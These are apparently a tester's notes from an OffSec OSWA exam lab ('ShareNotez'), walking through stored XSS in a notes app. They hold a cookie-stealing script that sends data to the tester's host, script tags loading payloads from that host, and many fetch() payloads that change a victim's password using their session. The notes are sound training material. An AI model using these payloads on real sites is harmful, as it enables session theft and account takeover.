# Initial Testing
created a user with `test:test` credentials
![[ss-20250919-OSWA-Exam-ShareNotez-pic1.png]]created a test note in the `content` section - this is what it looks like in `burp`
![[ss-20250919-OSWA-Exam-ShareNotez-pic2.png]]
## XSS Identification and exploitationg
testing for `XSS` with the payload `<h1>offsec</h1>` - vulnerable to XSS
![[ss-20250919-OSWA-Exam-ShareNotez-pic3.png]]
at `http://192.168.62.62/static/js/app.js` able to identify that a login function occurs with the administrator
![[ss-20250919-OSWA-Exam-ShareNotez-pic4.png]]
here is a better view 
![[ss-20250919-OSWA-Exam-ShareNotez-pic5.png]]
```js
function login() {
    var username = $('#username').val();
	var password = $('#password').val();
    
	var postBody = "username="+username+"&password="+password;
	fetch('https://'+domain+':8443/api/login', {
		method:'POST',
		mode:'cors',
		credentials:'include',
		headers:{
			'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8'
		},
		body:postBody
	})
	.then(response=>response.json())
	.then((data) => {
		if(data.status == "ok") {
			if("token" in data){
				localStorage.setItem('token', data.token);
			}
			if(data.isAdmin === "true") {
				window.location.href="/admin.php";
			} else {
				window.location.href="/profile.php";
			}
			
		} else {
            $('#message').text(data.message);
            $('#message').show();
        }
	});
}
```
first payload created to phish users `xss2.js` -> encode the cookie
```bash
let cookie = document.cookie

let encodedCookie = encodeURIComponent(cookie)

fetch("http://192.168.62.62/exfil?data=" + encodedCookie)
```
then placed in vulnerable `XSS` field to pull it back to my `kali` host
```bash
<script src="http://192.168.49.62:8000/xss2.js"></script>
<script src="http://192.168.49.62:8000/xss2-1.js"></script>
```
![[ss-20250919-OSWA-Exam-ShareNotez-pic6.png]]
can see that our http server was hit and pulled the `xss2.js` file
- note that the `IP` is the address of my `kali` host
![[ss-20250919-OSWA-Exam-ShareNotez-pic7.png]]
now what happens when it get reported after logging out of the `test` user
![[ss-20250919-OSWA-Exam-ShareNotez-pic8.png]]
almost immediately after reporting it i get a hit with a `304` and `200` error - the `192.168.49.62` is my kali machine and the `192.168.62.62` is the victim machine which successfully hit my `xss2.js` file
![[ss-20250919-OSWA-Exam-ShareNotez-pic9.png]]
after this i was able to see `xss2.js` in the info 
![[ss-20250919-OSWA-Exam-ShareNotez-pic10.png]]
after reporting the notes to trigger the `xss` from the admin side it take a while to be reviewed
![[ss-20250919-OSWA-Exam-ShareNotez-pic11.png]]
at `5:07` thats when the admin triggers the payload after review so if the payload didnt work at that point 
![[ss-20250919-OSWA-Exam-ShareNotez-pic12.png]]


```bash
fetch("http://192.168.62.62/static/js/app.js", {
  "headers": {
    "accept-language": "en-US,en;q=0.9",
    "Referer": "http://192.168.62.62/login.php?msg=Please+login+to+continue"
  },
  "body": null,
  "method": "GET"
});
```

used `me` with a test note and right clicked -> generate fetch to generate a starting fetch command
![[ss-20250919-OSWA-Exam-ShareNotez-pic13.png]]
the fetch command that was displayed from the test note
```bash
fetch("https://192.168.62.62:8443/api/me", {
  "headers": {
	
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9",
    "priority": "u=1, i",
    "sec-ch-ua": "\"Not=A?Brand\";v=\"24\", \"Chromium\";v=\"140\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Linux\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "sec-fetch-storage-access": "active",
    "cookie": "sessionToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJsb3Bob3N0cml4IiwiaXNBZG1pbiI6ImZhbHNlIiwiZXhwIjoxNzU4MzE1Nzc5LCJ1c2VySWQiOiIyMGY4YjExNy1kMzU0LTQ4MGYtODI3MC1kZWFmMGUwYmI2YmYiLCJ1c2VybmFtZSI6InRlc3QifQ.YWQO9qq3qSkRog3qMtUyzjJ2ZncdltI9nvRCj1tGNpg",
    "Referer": "http://192.168.62.62/"
  },
  "body": null,
  "method": "GET"
});
```
cleaning up the fetch 
```bash
fetch("https://192.168.62.62:8443/api/me", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9",
    "priority": "u=1, i",
    "sec-ch-ua": "\"Not=A?Brand\";v=\"24\", \"Chromium\";v=\"140\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Linux\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "sec-fetch-storage-access": "active",
    "cookie": "sessionToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJsb3Bob3N0cml4IiwiaXNBZG1pbiI6ImZhbHNlIiwiZXhwIjoxNzU4MzE1Nzc5LCJ1c2VySWQiOiIyMGY4YjExNy1kMzU0LTQ4MGYtODI3MC1kZWFmMGUwYmI2YmYiLCJ1c2VybmFtZSI6InRlc3QifQ.YWQO9qq3qSkRog3qMtUyzjJ2ZncdltI9nvRCj1tGNpg",
    "Referer": "http://192.168.62.62/"
  },
  "body": null,
  "method": "GET"
});
```

found the password function that allows me to change my password
```bash
fetch("https://192.168.62.62:8443/api/me/password", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
    "priority": "u=1, i",
    "sec-ch-ua": "\"Not=A?Brand\";v=\"24\", \"Chromium\";v=\"140\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Linux\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "sec-fetch-storage-access": "active",
    "cookie": "sessionToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJsb3Bob3N0cml4IiwiaXNBZG1pbiI6ImZhbHNlIiwiZXhwIjoxNzU4MzE2MjgzLCJ1c2VySWQiOiIyMGY4YjExNy1kMzU0LTQ4MGYtODI3MC1kZWFmMGUwYmI2YmYiLCJ1c2VybmFtZSI6InRlc3QifQ._x0_phIb0EbjMgCsXVZO4QdBKDLethNEcINkCxEKqS4",
    "Referer": "http://192.168.62.62/"
  },
  "body": "password=test3",
  "method": "POST"
});
```
cleaning it up and only leaving the `content-type` header - getting rid of the cookie header because it might auto fill, going to attempt to use this fetch to change my own password to `testest`
```bash
fetch("https://192.168.62.62:8443/api/me/password", {
  "headers": {
    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
  },
  "body": "password=testtest",
  "method": "POST"
});
```
payload to use 
```bash
<script src="http://192.168.49.62:8000/payload.js"></script>
```
got an unauth error
![[ss-20250919-OSWA-Exam-ShareNotez-pic14.png]]
payload2.js
```bash
fetch("https://192.168.62.62:8443/api/me/password", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
    "priority": "u=1, i",
    "sec-ch-ua": "\"Not=A?Brand\";v=\"24\", \"Chromium\";v=\"140\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Linux\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "sec-fetch-storage-access": "active"
  },
  "referrer": "http://192.168.62.62/",
  "body": "password=test2",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
```
got a `403` error 
![[ss-20250919-OSWA-Exam-ShareNotez-pic15.png]]going to retry from localhost context
payload3.js
```bash
fetch("https://localhost:8443/api/me/password", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
    "priority": "u=1, i",
    "sec-ch-ua": "\"Not=A?Brand\";v=\"24\", \"Chromium\";v=\"140\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Linux\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "sec-fetch-storage-access": "active"
  },
  "referrer": "http://192.168.62.62/",
  "body": "password=test2",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
```


```bash
fetch("https://localhost:8443/api/me/password", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
    "priority": "u=1, i",
    "sec-ch-ua": "\"Not=A?Brand\";v=\"24\", \"Chromium\";v=\"140\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Linux\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "sec-fetch-storage-access": "active"
  },
  "referrer": "http://192.168.62.62/",
  "body": "password=test2",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
```


payload 4

```bash
fetch("https://192.168.62.62:8443/api/me/password", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
  },
  body: "password=testtest",
  credentials: "include"
});
```

```bash
<script src="http://192.168.49.62:8000/payload4.js"></script>
```

```bash
fetch("https://localhost:8443/api/me/password", {
  "headers": {
    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
  },
  "body": "password=testtesttest",
  "method": "POST",
  "credentials": "include"
});
```
attempted using `payload4` gt a `MissingAllowOriginHeader`
![[ss-20250919-OSWA-Exam-ShareNotez-pic16.png]]
working header  - going to test with the `sessiontoken` 
```bash
fetch("https://192.168.62.62:8443/api/me/password", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
    "priority": "u=1, i",
    "sec-ch-ua": "\"Not=A?Brand\";v=\"24\", \"Chromium\";v=\"140\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Linux\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "sec-fetch-storage-access": "active",
    "cookie": "sessionToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJsb3Bob3N0cml4IiwiaXNBZG1pbiI6ImZhbHNlIiwiZXhwIjoxNzU4MzIwODg0LCJ1c2VySWQiOiIyMGY4YjExNy1kMzU0LTQ4MGYtODI3MC1kZWFmMGUwYmI2YmYiLCJ1c2VybmFtZSI6InRlc3QifQ.wjyseL8YdCqwYHSM33QPiVGUlG1bvu-D7Sm5CWTjBzw",
    "Referer": "http://192.168.62.62/"
  },
  "body": "password=test",
  "method": "POST"
});
```
changing to localhost as `payload6.js`
```bash
fetch("https://localhost:8443/api/me/password", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
    "priority": "u=1, i",
    "sec-ch-ua": "\"Not=A?Brand\";v=\"24\", \"Chromium\";v=\"140\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Linux\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "sec-fetch-storage-access": "active",
    "cookie": "sessionToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJsb3Bob3N0cml4IiwiaXNBZG1pbiI6ImZhbHNlIiwiZXhwIjoxNzU4MzIwODg0LCJ1c2VySWQiOiIyMGY4YjExNy1kMzU0LTQ4MGYtODI3MC1kZWFmMGUwYmI2YmYiLCJ1c2VybmFtZSI6InRlc3QifQ.wjyseL8YdCqwYHSM33QPiVGUlG1bvu-D7Sm5CWTjBzw",
    "Referer": "http://192.168.62.62/"
  },
  "body": "password=test",
  "method": "POST"
});
```
now trying to do `payload7.js` to change the password
```bash
fetch("https://localhost:8443/api/me/password", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
    "priority": "u=1, i",
    "sec-ch-ua": "\"Not=A?Brand\";v=\"24\", \"Chromium\";v=\"140\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Linux\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "sec-fetch-storage-access": "active",
    "cookie": "sessionToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJsb3Bob3N0cml4IiwiaXNBZG1pbiI6ImZhbHNlIiwiZXhwIjoxNzU4MzIwODg0LCJ1c2VySWQiOiIyMGY4YjExNy1kMzU0LTQ4MGYtODI3MC1kZWFmMGUwYmI2YmYiLCJ1c2VybmFtZSI6InRlc3QifQ.wjyseL8YdCqwYHSM33QPiVGUlG1bvu-D7Sm5CWTjBzw",
    "Referer": "http://192.168.62.62/"
  },
  "body": "password=testtesttest",
  "method": "POST"
});
```

```bash
POST /api/me/password HTTP/1.1
Host: 192.168.62.62:8443
Cookie: sessionToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJsb3Bob3N0cml4IiwiaXNBZG1pbiI6ImZhbHNlIiwiZXhwIjoxNzU4MzIxMjUyLCJ1c2VySWQiOiIyMGY4YjExNy1kMzU0LTQ4MGYtODI3MC1kZWFmMGUwYmI2YmYiLCJ1c2VybmFtZSI6InRlc3QifQ.glYKmvOwHXKRKNWVct9SOfoIiCKzlP3YIbgFdbIYG_s
Content-Length: 21
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not=A?Brand";v="24", "Chromium";v="140"
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: */*
Origin: http://192.168.62.62
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Sec-Fetch-Storage-Access: active
Referer: http://192.168.62.62/
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive

password=testtesttest
```
using 
https://curlconverter.com/javascript/ to generate `payload8`
```bash
fetch('https://192.168.62.62:8443/api/me/password', {
  method: 'POST',
  headers: {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'origin': 'http://192.168.62.62',
    'priority': 'u=1, i',
    'referer': 'http://192.168.62.62/',
    'sec-ch-ua': '"Not=A?Brand";v="24", "Chromium";v="140"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-storage-access': 'active',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
    'cookie': 'sessionToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJsb3Bob3N0cml4IiwiaXNBZG1pbiI6ImZhbHNlIiwiZXhwIjoxNzU4MzIxMjUyLCJ1c2VySWQiOiIyMGY4YjExNy1kMzU0LTQ4MGYtODI3MC1kZWFmMGUwYmI2YmYiLCJ1c2VybmFtZSI6InRlc3QifQ.glYKmvOwHXKRKNWVct9SOfoIiCKzlP3YIbgFdbIYG_s'
  },
  body: new URLSearchParams({
    'password': 'testtesttest'
  })
});
```
methods to test what context the session token is running in by using the console commands:
1.
```bash
fetch("https://192.168.62.62:8443/api/me", {
  credentials: "include"
}).then(r => r.json()).then(console.log);
```
2.
```bash
fetch("https://localhost:8443/api/me", {
  credentials: "include"
}).then(r => r.json()).then(console.log);
```
screenshot testing the 2 methods above 
![[ss-20250919-OSWA-Exam-ShareNotez-pic17.png]]
attempting to bypass prefetch error
```bash
fetch("/api/me/password", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  body: "password=adminxss",
  credentials: "include"
});
```
not found, need to change to `8443` on `https`
![[ss-20250919-OSWA-Exam-ShareNotez-pic18.png]]
as found in the `app.js`
![[ss-20250919-OSWA-Exam-ShareNotez-pic19.png]]
`payload10.js`
```js
fetch("https://192.168.62.62:8443/api/me/password", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  body: "password=adminxss",
  credentials: "include"
});
```
sending payload with 
```bash
<script src="http://192.168.49.62:8000/payload10.js"></script>
```
first `200` error looks like success
![[ss-20250919-OSWA-Exam-ShareNotez-pic20.png]]
tested new login credentials and was able to login with `test:adminxss` which are the credentials that the fetch changed
![[ss-20250919-OSWA-Exam-ShareNotez-pic21.png]]
what the whole `burp` request looks like after it works 
![[ss-20250919-OSWA-Exam-ShareNotez-pic22.png]]
reported the working `payload10.js` and now waiting to see if it gets executed
![[ss-20250919-OSWA-Exam-ShareNotez-pic23.png]]